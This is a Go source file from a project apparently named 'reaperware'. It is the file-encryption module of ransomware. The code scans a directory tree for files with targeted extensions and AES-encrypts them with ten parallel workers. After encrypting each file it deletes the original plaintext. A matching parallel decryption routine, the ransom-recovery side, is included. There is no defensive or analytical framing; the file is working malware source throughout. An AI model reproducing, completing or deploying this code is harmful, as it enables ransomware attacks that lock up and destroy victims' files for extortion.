package filedirectory

import (
	"log"
	"os"
	"reaperware/pkg/aeskeys"
	"sync"
)

// FileTask represents the information needed to encrypt a single file
type FileTask struct {
	InputFilePath  string
	OutputFilePath string
	DecryptedPath  string
}

// encryptFileTask processes a single file encryption task
func encryptFileTask(task FileTask, aesKey []byte, id int) {
	// Initialize the Encryptor with file paths
	fileEncryptor := aeskeys.NewEncryptor(aesKey, task.InputFilePath, task.OutputFilePath, task.DecryptedPath)

	// Perform encryption
	fileEncryptor.Encrypt(id)
	log.Printf("[+] [Worker %d] File %s encrypted successfully\n", id, task.InputFilePath)

	// Delete the original plaintext file
	err := os.Remove(task.InputFilePath)
	if err != nil {
		log.Printf("[-] [Worker %d] Error deleting file %s: %v\n", id, task.InputFilePath, err)
	} else {
		log.Printf("[+] [Worker %d] Original file %s deleted successfully\n", id, task.InputFilePath)
	}
}

// Init decryptor with file paths and perform decryption
func decryptFileTask(task FileTask, aesKey []byte, id int) {
	fileDecryptor := aeskeys.NewEncryptor(aesKey, task.InputFilePath, task.OutputFilePath, task.DecryptedPath)
	fileDecryptor.Decrypt(id)
	log.Printf("[+] [Worker %d] File %s decrypted successfully\n", id, task.InputFilePath)
}

// worker is a goroutine that processes FileTask jobs from the jobs channel
func worker(id int, aesKey []byte, jobs <-chan FileTask, wg *sync.WaitGroup) {
	defer wg.Done()
	for task := range jobs {
		log.Printf("[+] [Worker %d] Encrypting file: %s\n", id, task.InputFilePath)
		encryptFileTask(task, aesKey, id)
	}
}

// encryptFilesInParallel encrypts multiple files concurrently
func EncryptFilesInParallel(aesKey []byte, files []FileTask, numWorkers int) {
	var wg sync.WaitGroup
	jobs := make(chan FileTask, len(files))

	// Start workers
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go worker(i, aesKey, jobs, &wg)
	}

	// Send jobs to the channel
	for _, file := range files {
		jobs <- file
	}

	close(jobs) // Close the jobs channel to signal workers that there are no more tasks
	wg.Wait()   // Wait for all workers to finish
}

// Orchestrates the decryption for files
func DecryptFileTask(aesKey []byte, task FileTask, id int) {
	decryptor := aeskeys.NewAESDecryptor(aesKey, task.InputFilePath)
	decryptor.DecryptFile(task.DecryptedPath, id)

	// Delete the original plaintext file
	err := os.Remove(task.InputFilePath)
	if err != nil {
		log.Printf("[-] [Worker %d] Error deleting file %s: %v\n", id, task.InputFilePath, err)
	} else {
		log.Printf("[+] [Worker %d] Original file %s deleted successfully\n", id, task.InputFilePath)
	}
}

// Processes decryption tasks from the jobs channel
func workerDecrypt(id int, aesKey []byte, jobs <-chan FileTask, wg *sync.WaitGroup) {
	defer wg.Done()
	for task := range jobs {
		log.Printf("[Worker %d] Decrypting file: %s\n", id, task.InputFilePath)
		DecryptFileTask(aesKey, task, id)
	}
}

// Decrypts multiple files concurrently
func DecryptFilesInParallel(aesKey []byte, files []FileTask, numWorkers int) {
	var wg sync.WaitGroup
	jobs := make(chan FileTask, len(files))

	// Start workers
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go workerDecrypt(i, aesKey, jobs, &wg)
	}

	// Send jobs to the channel
	for _, file := range files {
		jobs <- file
	}

	close(jobs) // Close the channel to signal no more tasks
	wg.Wait()   // Wait for all workers to finish
}

// Find files and encrypt them
func EncryptTheFiles(rootDir string, aesKey []byte) {
	// Create and run FileScanner
	fileScanner := NewFileScanner(rootDir, Extensions, ExcludedDirs)
	fileScanner.Start()

	// Convert scanned files to FileTask slice
	fileTasks := fileScanner.ToFileTasks()

	// Number of workers to process files concurrently
	numWorkers := 10

	// Encrypt files in parallel
	EncryptFilesInParallel(aesKey, fileTasks, numWorkers)

	log.Println("[+] All files encrypted successfully!")
}
